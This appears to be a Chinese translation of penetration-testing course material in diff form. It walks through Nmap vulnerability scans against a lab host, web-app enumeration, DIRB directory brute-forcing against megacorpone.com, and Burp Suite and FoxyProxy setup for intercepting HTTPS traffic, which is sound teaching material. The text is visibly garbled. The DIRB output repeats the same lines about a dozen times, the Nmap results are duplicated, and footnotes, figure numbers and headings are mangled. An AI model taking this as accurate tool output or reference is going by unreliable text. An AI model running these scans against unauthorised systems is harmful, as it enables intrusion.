+Entry { filename = "distcc-cve2004-2687.nse", categories = { "exploit", "intrusive", } }
+Entry { filename = "ftp-proftpd-backdoor.nse", categories = { "exploit", "intrusive", } }
+Entry { filename = "fsftp-vsftpd-backdoor.nse", categories = { "exploit", "intrusive", } }
+...
+```
+
+列表 278 - Nmap 脚本数据库
+
+让我们使用 `NSE` 来检测漏洞。例如，我们将使用 `--script vuln` 对 PWK 实验室中的目标运行“vuln” 类别中的所有脚本：
+
+```
+kali@kali~$ sudo nmap --script vuln 10.0.1.10
+[sudo] password for kali:
+Starting Nmap 7.0 ( https://nmap.org )
+Pre-scan script results:
+| broadcast-avahi-dos:
+| Discovered hosts:
+```
+
+³ (`Nmap, 2019`), `https://nmap.org/book/nse-language.html`
+
+224.0.0.251
+
+After NULL UDP avail packet DoS (CVE-2011-1002).
+
+所有主机均在线（无漏洞）。
+
+Nmap 扫描报告针对 10.0.1.10
+
+主机在线（延迟 0.099s）。
+
+未显示：999 个过滤端口
+
+端口 状态 服务
+
+80/tcp  http
+
+http-cookie-flags:
+
+/CFIDE/administrator/enter.cfm:
+
+CFID:
+
+htponly flag not set
+
+CFTOKEN:\htponly flag not set
+
+/CFIDE/administrator/entman.cfm:
+
+CFID:
+
+htponly flag not set
+
+CFTOKEN:\htponly flag not set
+
+/CFIDE/administrator/archives.cfm:
+
+CFID:
+
+htponly flag not set
+
+CFTOKEN:\htponly flag not set
+
+/_http_csrf: 未发现任何 CSRF 漏洞。
+
+/_http-dom-xss: 未发现任何 DOM 漏洞。
+
+http-enum:
+
+/CFIDE/administrator/enter.cfm: ColdFusion 管理控制
+
+/CFIDE/administrator/entman.cfm: ColdFusion 管理控制
+
+/cfdi/install.cfm: ColdFusion 管理控制
+
+/CFIDE/administrator/archives.cfm: ColdFusion 管理控制
+
+/cfdi/utils/login.cfm: ColdFusion 管理控制
+
+/_http_csrf: 未发现任何 CSRF 漏洞。
+
+/_http-dom-xss: 未发现任何 DOM 漏洞。
+
+http-enum:
+
+/CFIDE/administrator/enter.cfm: ColdFusion 管理控制
+
+/CFIDE/administrator/entman.cfm: ColdFusion 管理控制
+
+/cfdi/install.cfm: ColdFusion 管理控制
+
+/CFIDE/administrator/archives.cfm: ColdFusion 管理控制
+
+/cfdi/utils/login.cfm: ColdFusion 管理控制
+
+/_http_csrf: 未发现任何 CSRF 漏洞。
+
+/_http-dom-xss: 未发现任何 DOM 漏洞。
+
+238
+
+http://www.nessus.org/plugins/index.php?view=single&id=48340
+
+MAC 地址: 00:50:56:93:38:4C (VMware)
+
+列表 279 - 使用 Nmap 的 'vuln' 脚本检测特定漏洞
+
+## 9. Web应用程序攻击
+
+在本模块中，我们将重点关注常见Web应用程序漏洞的识别和利用。现代开发框架和托管解决方案简化了基于Web应用程序的构建和部署过程。然而，由于缺乏应用代码、多个依赖项以及不安全的配置，这些应用程序通常会暴露巨大的攻击面。
+
+Web 应用程序可以使用多种编程语言和框架编写，每种框架都可能引入特定类型的漏洞。然而，无论底层技术栈如何，最常见的漏洞在概念上是相似的。
+
+在本模块中，我们将讨论Web应用程序漏洞的枚举和利用。尽管漏洞和攻击的复杂性各不相同，但我们将演示 OWASP Top 10 列表列出的几种常见Web应用程序漏洞的利用。这些攻击将作为构建更高级攻击的基础组件。
+
+## 9.1 Web应用程序评估方法论
+
+在讨论枚举和利用之前，我们将介绍基础的Web应用程序渗透测试方法论。
+
+
+
+作为第一步，我们应该收集有关应用程序的信息。该应用程序是做什么的？用什么语言编写的？应用程序运行在什么服务器上？这些问题和其他问题的答案将引导我们走向第一个（或下一个）潜在攻击向量。
+
+与许多渗透测试领域一样，每次尝试利用的目标都是为了增加我们在应用程序中的权限，或跳转到另一个应用程序或目标。过程中的成功利用可能会让我们获得应用程序中新功能或组件的访问。我们可能需要成功执行多次利用，才能从未身份验证的用户账户推进到系统的任何种`shell`。
+
+在每一步中枚举新功能都至关重要，特别是以前失败的攻击在新的语境下可能会成功。作为渗透测试员，我们必须继续枚举和审计，直到耗尽所有攻击或攻破系统。
+
+## 9.2 Web应用程序枚举
+
+在尝试盲目利用Web应用程序之前，识别构成该应用程序的组件至关重要。许多Web漏洞与技术无关的。然而，某些利用程序和载荷（`payload`）需要根据应用程序的技术基础（例如数据库软件或操作系统）进行定制。在对Web应用程序发起任何攻击之前，我们应该尝试发现正在使用的技术栈，它通常由以下组件组成：
+
+- 编程语言和框架
+- Web服务器软件
+- 数据库软件
+- 服务器操作系统
+
+我们有几种技术可以直接从浏览器中收集这些信息。大多数浏览器都包含了可以辅助枚举过程的开发人员工具。我们将关注 Firefox，因为它是 Kali Linux 的默认浏览器。不过，大多数浏览器都包含类似的开发人员工具。
+
+### 9.2.1 检查URL
+
+文件扩展名有时是URL的一部分，可以揭示应用程序编写的编程语言。在某些扩展中，`.php` 是直观的，但其他扩展更为晦涩，并根据所使用的框架而异。例如，基于Java的Web应用程序可能会使用 `jsp`、`.do` 或 `.html`。
+
+然而，网页上的文件扩展名变得越来越常见，因为许多语言和框架现在都支持“路由”（`routes`）的概念，这允许开发者将URI映射到代码段。利用路由的应用程序使用逻辑来确定返回给用户的内容，这使得URI扩展变得很大无关紧要。
+
+### 9.2.2 检查页面内容
+
+虽然检查URL可以提供有关Web应用程序的一些线索，但大多数上下文线索可以在网页的源代码中找到。Firefox调试工具（在“开发者”菜单中或通过按下 `Ctrl+Shift+K` 打开）显示页面资源和内容，这些内容随应用程序而异。调试工具可能会显示JavaScript框架、隐藏输入字段、注释、HTML中的客户端控件、JavaScript以及更多。
+
+为了演示这一点，我们可以在浏览 `we.megacorp.com` 时打开调试器：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_240_0.png)
+
+我们可以看到运行在 `megacorpone.com`上的应用程序使用了 `jQuery` 版本 1.11.0，这是一个常用的JavaScript库。在这种情况下，开发者对代码进行了压缩处理，使其更加紧凑并节省了资源，但使其阅读变得有些困难。幸运的是，我们可以通过点击带有双括号的“格式化打印”（Pretty print source）按钮在Firefox中“格式化”代码：
+
+图84：格式化打印源代码
+
+点击“检查”（Inspect）后，Firefox将以易读的格式显示代码：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_242_0.png)
+
+图85：格式化后的源代码
+
+我们还可以使用检查器（Inspector）深入研究特定内容。让我们通过右键点击元素并使用Firefox快捷键使用检查器检查页面：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_243_0.png)
+
+### 9.2.3 查看响应
+
+我们可以搜索响应以获取额外信息。我们可以使用两种类型的工具来完成此任务。第一类工具是代理（`proxy`），它拦截客户端和Web服务器之间的请求和响应。我们将在模块的后续部分探索代理，但首先我们将探索从Firefox开发者菜单启动的“网络”（Network）工具来查看流量。该工具显示之后发生的网络活动，因此我们必须刷新页面才能看到：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_244_0.png)
+
+| 状态 | 方法 | 文件 | 域名 | 缓存 | 类型 | 传输... | 大小 | 毫秒 | 时间 |
+| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
+| 200 | GET | bootstrap.css | www.megacorp.document | | | | 12.50 KB | | +148 ms |
+| 200 | GET | stylesheet.css | www.megacorp.stylesheet | | | | 118.38 KB | | +232 ms |
+| 200 | GET | style.css | www.megacorp.stylesheet | | | | 8.94 KB | | +140 ms |
+| 200 | GET | font-awesome-min.js | www.megacorp.script | | | | 17.63 KB | | +149 ms |
+| 200 | GET | bootstrap.min.js | www.megacorp.script | | | | 28.71 KB | | +153 ms |
+| 200 | GET | retina-1.0.js | www.megacorp.script | | | | 4.18 KB | | +217 ms |
+| 200 | GET | jquery.hoverdr.js | www.megacorp.script | | | | 5.47 KB | | +205 ms |
+
+图17：使用网络工具
+
+![](img/f99f528ca9845f4c256ce54e882b1345_245_0.png)
+
+我们可以点击请求以获取其更多详细信息，在此例中为响应头：
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_246_0.png)
+
+图 9：在网络工具中查看响应标头
+
+上方显示的“Server”标头将显示 Web 服务器的名称。在许多默认配置中，它还会显示版本号。
+
+以“X-” 开头的标头是非标准 HTTP 标头。名称或值通常会揭示有关应用程序所用技术栈的额外信息。非标准标头的的一些示例包括 `X-Powered-By`、`x-amz-cf-id` 和 `X-Asnet-Version`。对这些进行进一步研究可能会发现更多信息，例如“`x-amz-cf-id`”标头，它指示应用程序使用了 CloudFront。
+
+### 9.2.4 检查站点地图 (Sitemaps)
+
+Web 可以包含站点地图，以帮助搜索引擎爬取和索引其网站。这些文件还指向敏感页面或管理控制台——直接指向我们感兴趣的页面。
+
+两个最常见的站点地图文件名是 `robots.txt` 和 `sitemap.xml`。
+
+例如，我们可以使用 `curl` 从 `google.com` 获取 `robots.txt` 文件：
+
+```
+kali@kali:~$ curl https://www.google.com/robots.txt
+User-agent: *
+```
+
+> 240 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
+
+# 攻击性安全
+
+```
+Disallow: /search
+Allow: /search/about
+Disallow: /search/static
+Allow: /search/howsearchworks
+Disallow: /sdch
+Allow: /groups
+Disallow: /index.html?
+Disallow: ?
+Allow: ?hl=
+```
+
+`Allow` 和 `Disallow` 是指令，分别用于“礼貌”网络爬虫可以访问或禁止访问的网页或目录。尽管案例中列出的页面和目录可能并不有趣，有些甚至可能被查看，但不应忽视站点地图文件，因为它们可能包含有关网站布局或其他信息的线索。
+
+### 9.2.5 定位管理控制台
+
+Web 服务器通常带有远程管理 Web 应用程序或控制台，可以通过特定的 URL 访问，并且通常监听在特定的 TCP 端口上。两个常见的示例是 Tomcat 的 `manager` 应用程序以及托管在 `/manager` 和 `phpmyadmin` 的 phpMyAdmin。
+
+虽然这些控制台被限制本地访问，或可能托管在自定义 TCP 端口上，但我们经常在默认配置中发现它们向外暴露。无论如何，渗透测试人员应该检查应用程序服务器文档中确定的默认控制台位置。在以下章节中，我们还将演示用于自动化搜索这些控制台的工具，并在随后的章节中演示利用技术。
+
+## 9.3 Web 应用程序评估工具
+
+一旦我们手动彻底探索了一个 Web 应用程序，就应该考虑使用应用程序评估工具来枚举有关目标的更多信息。
+
+
+
+有很多工具可以帮助发现和探索 Web 应用程序漏洞，其中许多已预装在 `Kali` 中。在本节中，我们将探索其中一些工具，包括几个简单的浏览器扩展，在随后的章节中，我们将重点转向手动漏洞枚举和利用。
+
+> ⁴¹ (Apache Software Foundation, 2019), https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html
+
+> ²⁴² (phpMyAdmin, 2019), https://www.phpmyadmin.net/
+
+自动化工具可以提高渗透测试人员的效率，但我们也必须识别手动利用技术，因为工具并非在每情况下都可用，而且手动技术提供了更大的灵活性和定制性。记住，工具和自动化让我们的工作变得简单，它们不会替你完成工作。
+
+# 9.3.2 DIRB
+
+`DIRB`²⁴³ 是一种 Web 内容扫描器，它使用字典列表通过向服务器发送请求来查找目录和页面。即使主索引页缺失，`DIRB` 也能识别 Web 服务器上有效的页面。
+
+默认情况下，`DIRB` 会识别服务器上的目录，但也可以进行自定义以搜索特定目录，使用自定义字典、在每个请求中使用 `set cookie` 或标头等。
+
+让我们在 `megacorpone.com` 上运行 `DIRB`。我们将提供几个参数：要扫描的 URL、`-r` 表示非递归，以及 `-z 10` 表示每个请求添加 10 毫秒的延迟：
+
+
+
+```
+kali@kali:$ dirb http://www.megacorpone.com -r -z 10
+...
+URL_BASE: http://www.megacorpone.com/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: not Recursive
+SPEED_DELAY: 10 milliseconds
+
+GENERATED WORDS: 4612
+
+- Scanning URL: http://www.megacorpone.com/-
++ http://www.megacorpone.com/about (CODE:200|SIZE:12180)
++ http://www.megacorpone.com/admin (CODE:403|SIZE:292)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/index.html (CODE:200|SIZE:12519)
+== DIRECTORY: http://www.megacorpone.com/assets/
++ http://www.megacorpone.com/contact (CODE:200|SIZE:7721)
++ http://www.megacorpone.com/index (CODE:200|SIZE:12519)
++ http://www.megacorpone.com/admin (CODE:403|SIZE:292)
+```
+
+> `Diruster` 是一个 Java 应用程序，类似于 `DIRB`，提供多线程和 GUI 界面。
+
+# 9.3.3 Burp Suite
+
+`Burp Suite`²⁴⁴ 是一个面向 Web 安全的工具集，被誉为强大的代理工具。虽然社区版包含手动测试工具，商业版包含额外功能，如强大的 Web 扫描器。`Burp Suite` 在 `OSCP` 考试中是允许的，但它并不是必要的。
+
+> ²⁴⁴ (PortSwigger, 2019), https://portswigger.net/burp
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_250_0.png)
+
+图 90：启动 `Burp Suite`
+
+我们也可以从命令行启动它：
+
+```
+kali@kali:~ burpsuite
+```
+
+
+
+> 282 - 从终端启动 Burp Suite
+
+一旦启动，我们将选择临时项目并点击“下一步”。
+
+# OFFENSIVE SECURITY
+www.offensive-security.com
+Penration Testing with Linux 2.0
+
+欢迎使用 Burp Suite 社区版。使用以下选项创建或打开项目。
+
+注意：基于磁盘的项目仅支持 Burp Professional。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_251_0.png)
+
+图 91：Burp启动
+
+- 临时项目
+- 在磁盘上新建项目
+  - 文件：[选择文件...]
+  - 标识：
+- 打开现有项目
+  - 标识 | 文件
+  - 文件：[选择文件...]
+暂停爬虫和扫描器
+
+- 选择您想要为此项目加载的配置
+  - 使用 Burp 默认设置
+  - 使用保存的项目选项
+  - 从配置文件加载
+    - 文件：[选择文件...]
+  - 后续默认使用上述设置
+  - 禁用扩展
+取消  返回  启动 Burp
+
+![](img/f99f528ca9845f4c256ce54e882b1345_251_1.png)
+
+图 92：Burp 配置
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+稍等片，界面（UI）将加载。
+
+```
+Burp: Project Intruder Repeater Window Help
+
+Target Proxy Intruder Repeater Sequencer Decoder Compar Comparator Extender Project options User options
+```
+
+
+
+| 仪表板 | 新扫描 | 新加载任务 |
+|---|---|---|
+| 任务 | | |
+| 过滤 运行中 已暂停 已完成 | |
+
+# 问题活动 [仅限专业版]
+
+| 过滤器 | 高 | 中 | 低 | 提示 | 确定 | 确定 | 待定 |
+|---|---|---|---|---|---|---|---|
+| 问题类型 主机 | | | | | | | | |
+| 1 可疑的输入转换（反射型） | http://insecure-bank.com... | | | | | | | |
+| 2 SQL 注入 | http://insecure-bank.com... | | | | | | | |
+| 3 HTTP 消息中的序列化对象 | http://insecure-bank.com... | | | | | | | |
+| 4 跨站脚本 (XSS) | http://insecure-bank.com... | | | | | | | |
+| 5 XML 外部实体注入 | http://insecure-bank.com... | | | | | | | |
+| 6 外部交互 (HTTP 交互) | http://insecure-we-bi... | | | | | | | |
+| 7 服务端模板注入 | http://insecure-bank.com... | | | | | | | |
+| 8 SQL 注入 | http://insecure-bank.com... | | | | | | | |
+
++ 1. 来自代理的被动爬取（所有流量） 
+添加链接。添加项目本身。... | | 站点已添加 0 个项目
+捕获： | 已处理 0 个响应
+
+# 事件日志
+
+| 时间 | 类型 | 来源 | 消息 |
+|---|---|---|---|
+| 11:55:19 2019年7月22日 | 提示 | 代理 | 代理服务已启动 |
+
+![](img/f99f528ca9845f4c256ce54e882b1345_252_0.png)
+
+让我们从代理工具开始。通过此工具，我们可以在浏览器请求发送到服务器之前拦截它的任何请求。我们可以更改此请求的几乎任何内容，例如参数名称、表单值或添加标头。这让我们能够测试应用程序如何处理意外输入。例如，一个输入字段可能有一个 20 个字符的长度限制，但我们可以使用 `Burp Suite` 修改请求以支持 30 个字符。
+
+为了设置代理，我们将点击 `Proxy`（代理）选项卡以显示多个子选项卡，并禁用位于 `Intercept`（拦截）选项卡下的 `Intercept` 工具。当 `Intercept` 处于启用状态时，我们必须手动点击 `Forward`（转发）来将每个请求发送到其目的地。或者，我们可以点击 `Drop`（丢弃）来不发送请求。在某些情况下，我们想要拦截并修改流量，但当我们只是浏览网站时，每个请求都必须点击 `Forward` 会变得非常繁琐。
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+`Intercept` 开/关切换按钮显示工具的当前状态，并可以根据需要启用或禁用。因此，我们将设置为 `Intercept is off`（拦截关闭），以允许我们的浏览器流量正常流动。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_253_0.png)
+
+`PWK 2.0` 版权 © Offensive Security Ltd. 保留所有。
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+接下来，我们查看代理监听器设置。`Options` 子选项卡显示了哪些端口正在监听代理请求。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_254_0.png)
+
+默认情况下，`Burp Suite` 在 `localhost:8080` 上启用了代理监听器。这是我们的浏览器为了通过 `Burp Suite` 代理流量而连接的主机和端口。我们将保留这些默认设置。
+
+在 `Burp Suite` 的默认配置中，`Intercept` 工具在启动时已启用。我们可以在 `User Options > Misc > Proxy Interception` 下检查此处。然而，许多用户倾向于在启动时禁用 `Intercept`，可以通过选择 `Disable` 来。或者，我们仍然可以手动切换 `Proxy Intercept > Intercept is on/off` 的开启和关闭。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_255_0.png)
+
+图 9：启动时禁用拦截
+
+# OFFENSIVE SECURITY
+
+使用 Kali Linux 2.0 进行渗透测试
+
+接下来，我们将选择 `Proxy` 然后 `HTTP history`（HTTP 历史）。在流量通过 `Burp Suite` 之前，内容将是空的：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_256_0.png)
+
+图 97：代理历史
+
+根据作者介绍，`FoxyProxyBasic`²⁵ 是 Firefox 的一个“简单/开启关闭代理切换器”插件。我们将使用它来启用或禁用 Firefox 代理设置。现在是最新版，我们可以通过点击 Firefox 的 Open 菜单并从菜单选择“Add-ons”（插件）来操作：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_256_1.png)
+
+图 98：Firefox 菜单
+
+`FoxyProxy` ²⁴ (Mozilla, 2019), https://addons.mozilla.org/en-US/addons/foxyproxy/ `PWK 2.0` 版权 © Offensive Security Ltd. 保留所有。当 Add-ons 管理器打开后，我们在搜索框中输入 `FoxyProxy`。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_257_0.png)
+
+图 99：插件管理器
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+此时，在编写时，`FoxyProxy` 有版本：Basic 和 Standard。我们将使用 Basic，因为它更容易配置，而且我们不需要 Standard 的额外功能。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_258_0.png)
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+接下来，我们将点击 `FoxyProxy` 查看插件的详细信息，然后点击 `Add` 安装。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_259_0.png)
+
+图 101：FoxyProxy
+
+在我们接受 `FoxyProxy` 的权限后，安装完成后将出现一条欢迎消息。我们可以通过图标来检查此处。如果它有红圈，说明插件处于禁用状态。在启用它之前，我们需要添加一个配置。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_260_0.png)
+
+# OFFENSIVE SECURITY
+
+使用 Kali Linux 2.0 进行渗透测试
+
+此消息仅在 `FoxyProxy` 安装后出现。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_261_0.png)
+
+# FProxy 欢迎！
+
+`FoxyProxy` 已经存在了近 15 年。如果你正在从旧版本升级且代理设置丢失了，请导入它们。
+
+# 更新内容
+
+- 替换了过时的查询
+- 添加了 i18n 支持
+- 移除了内联编辑
+- 初始化了容器
+- 各种 UI 改进
+
+`FoxyProxy` 默认禁用。我们可以通过图标来检查此处。如果它有红圈，说明插件处于禁用状态。在启用它之前，我们需要添加一个配置。
+
+# 首先，点击小狐狸图标打开配置界面并选择 Options。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_262_0.png)
+
+# OFFENSIVE SECURITY
+
+使用 Kali Linux 2.0 进行渗透测试
+
+在 `Options` 页面上，我们将点击 `Add` 打开“添加代理”屏幕。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_263_0.png)
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+为了为 `Burp Suite` 设置配置，我们首先将 `Proxy` 类型设置为“HTTP”，将 `Title` 设置为“Burp”，并将 IP 地址设置为“127.0.0.1”。此外，我们将添加 `Burp Suite` 监听器端口号，我们保留了默认的 `8080`。最后，我们点击 `Save`。
+
+在我们之后，将在 `Options` 页面上看到我们的新代理。我们可以再次点击 `FoxyProxy` 图标并然后点击为 `Burp` 代理所有 URL（忽略模式）来启用它。
+
+`FoxyProxy` 图标不应被划掉，并且在图标上应显示 "Burp"。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_265_0.png)
+
+# OFF 攻击性安全
+www.offensive-security.com
+
+使用 Kali Linux 进行渗透测试 2.0
+
+通过代理拦截，我们可以关闭任何额外的打开标签页并访问 `http://www.megacorpone.com`。我们应该在 `BurpSuite` 的 `Proxy > HTTP History` 下看到流量。
+
+`Burp. Proxy. Intruder. Repeater. Window. Help.`
+
+| 仪表板 (Dashboard) | 代理 (Proxy) | 入侵者 (Intruder) | 重复 (Repeater) | 序列器 (Sequencer) | 解码器 (Decoder) | 比较 (Comparer) | 扩展 (Extender) | 项目选项 (Project options) | 用户选项 (User options) |
+| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
+| 拦截 (Intercept) | HTTP 历史 (HTTP History) | 重复 (Repeater) | 选项 (Options) | | | | | | |
+| # | 主机 (Host) | 方法 (Method) | URL | 参数 (Params) | 已修改 (Edited) | 状态 (Status) | 长度 (Length) | MIME 类型 | 扩展 (Extension) |
+| 14 | www.megacorpone.com | GET | /assets/js/jquery.min.js | | | 304 | 187 | script | |
+| 13 | www.megacorpone.com | GET | /assets/js/jquery.min.js | | | 304 | 171 | script | |
+| 10 | www.megacorpone.com | GET | /assets/js/hivex.min.js | | | 304 | 173 | script | |
+| 9 | www.megacorpone.com | GET | /assets/js/hoverdr.min.js | | | 304 | 172 | script | |
+| 8 | www.megacorpone.com | GET | /assets/js/jquery.min.js | | | 304 | 172 | script | |
+| 7 | www.megacorpone.com | GET | /assets/js/isotope.min.js | | | 304 | 175 | script | |
+| 6 | www.megacorpone.com | GET | /assets/js/jquery.min.js | | | 304 | 175 | script | |
+| 5 | www.megacorpone.com | GET | /assets/js/bootstrap.min.js | | | 304 | 172 | script | |
+| 1 | www.megacorpone.com | GET | / | | | 304 | 174 | | |
+
+图 108: Burp Suite HTTP 历史
+
+如果浏览器在加载页面时卡住，可能是启用了拦截（Intercept）。关闭它将允许流量在我们浏览额外页面时不受中断地流动，我们应该在 `HTTP History` 标签页中看到更多请求。
+
+> 为什么 detectportal.firefox 一直出现在代理历史中？强制门户（Captive portal）是在你尝试浏览互联网时作为某种网关页的网页。它通常在通过浏览器接受 Wi-Fi 网络的的用户协议或进行身份验证时显示。要忽略这一点，只需在地址栏中输入 `about:config`。Firefox 将显示一个警告，我们可以点击“我接受风险！”来继续。最后，搜索 "network.captive-portal-service" 并双击它将值更改为 "false"。这将防止这些消息出现在代理历史中。
+
+⁶(Wikipedia, 2019), https://en.wikipedia.org/wiki/Captive_portal
+
+`PWK 2.0` © Offensive Security Ltd. 保留所有权利。
+
+## 使用 Kali Linux 进行渗透测试 2.0
+
+此时，Firefox 现在正通过 `Burp Suite` 代理所有流量。到目前为止，我们只看了明文 HTTP 流量。然而，如果有一个 HTTPS 站点通过 Burp 代理流量（例如 `https://www.google.com`），我们将看到“无效证书”的警告：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_267_0.png)
+
+图：109: Firefox 中的不安全连接警告
+
+`Burp` 可以通过生成自己的 SSL/TLS 证书轻松地解密 HTTPS 流量，本质上是我们自己进行中间攻击²47 以捕流量。这些警告可能令人讨厌，但我们可以通过发布新证书并将其导入 Firefox 来防止它们。
+
+> ²47 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Man-in-the-middle_attack
+
+## 使用 Kali Linux 进行渗透测试 2.0
+
+尽管每个 `Burp Suite` CA 证书都应该是唯一的，但我们将通过重新生成它来确保这一点。
+要做到这一点，我们将导航到 `BurpSuite` 中的 `Proxy > Options > Proxy Listeners`，并点击所示的重新生成 CA 证书（`Regenerate CA certificate`）：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_268_0.png)
+
+每个安装的 `Burp Suite` 都会生成自己的 CA 证书，代理 监听器在协商 SSL 连接时会使用该证书。你可以将此证书导入或导出到另一个安装的：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_268_1.png)
+
+拦截请求 (Intercept Requests)
+使用这些设置来控制哪些请求停留以便查看。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_268_2.png)
+
+图 110: 重新生成 Burp 的证书
+
+在确认对话框上点击“是”并重启 `Burp Suite`。要将新的 CA 证书导入 Firefox，我们将首先访问 `http://burp` 找到证书链接：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_268_3.png)
+
+图 111: Burp 欢迎
+
+## 使用 Kali Linux 进行渗透测试
+
+要查看证书，我们在在此屏幕上点击 CA（连接 `http://burp/cert`）并将 cert 文件 保存到本地机器。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_269_0.png)
+
+下载完成后，我们可以将下载的文件拖入 Firefox 并选择此 CA。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_269_1.png)
+
+要验证导入成功，我们可以再次访问 HTTPS 站点，例如 `https://www.google.com`，它应该在没有警告的情况下在 `Burp Suite` 的 `HTTP History` 中生成流量。`PWK 2.0` © Offensive Security Ltd. 保留所有权利。
+
+最后，通过重复（Repeater），我们可以轻松地修改请求、重新发送并查看响应。要执行此操作，从 `Proxy -> HTTP History` 右键点击请求并发送到 `Repeater`。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_270_0.png)
+
+图 14: 将请求发送到 Repeater
+
+`PWK 2.0` © Offensive Security Ltd. 保留所有权利。
+
+## 使用 Kali Linux 进行渗透测试
+
+如果我们点击 `Repeater`，窗口左侧将有一个请求的子标签页。我们可以向 `Repeater` 发送多个请求，它们将在单独标签页中显示。我们可以通过点击 `Send` 将请求发送到服务器。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_271_0.png)
+
+图 15: Burp Suite Repeater
+
+## 使用 Kali Linux 进行渗透测试
+
+`Burp Suite` 将窗口右侧显示服务器响应，其中包括响应头和未渲染的内容。# Burp Suite 社区 v2.1.0 - 临时项目
+
+![](img/f99f528ca9845f4c256ce54e882b1345_272_0.png)
+
+图 116: 带有请求和响应的 Burp Suite
+
+Web 应用程序利用提交和修改请求以及监控响应需要大量的尝试。当我们能够快速查看请求元素而无需等待浏览器渲染时，响应非常有用。
+
+### 9.3.4 Nikto
+
+`Nikto` 是一个高度可配置的开源 Web 服务器扫描器，用于测试数千危险文件和程序、漏洞版本以及各种服务器配置。性能良好，但如果在 `User-Agent` 中嵌入自身信息，深度还可以增加。
+
+`Nikto` 可以扫描多个服务器和端口，并扫描它能找到的所有页面。在内容丰富的网站上（例如电子商务网站），`Nikto` 扫描可能需要几小时才能完成。我们有两个选项控制扫描时长。简单的方法是使用 `-maxtime` 选项，它将在指定的时间限制后停止扫描。这不会优化扫描。我们的第二个选项是使用 `-T` 选项进行调优。
+
